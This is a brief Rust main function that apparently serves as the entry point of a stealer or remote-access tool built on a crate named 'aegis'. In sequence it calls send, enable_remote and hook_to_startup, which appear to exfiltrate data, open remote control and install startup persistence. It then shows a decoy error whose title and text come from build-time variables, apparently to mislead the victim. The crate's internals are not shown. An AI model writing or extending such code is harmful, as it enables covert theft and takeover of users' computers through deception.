#[tokio::main]
async fn main() {
    aegis::send().await;

    aegis::enable_remote().await.ok();
    aegis::hook_to_startup().await.ok();

    aegis::show_error(
        option_env!("FE_TITLE").unwrap(),
        option_env!("FE_MSG").unwrap(),
    )
    .await;
}
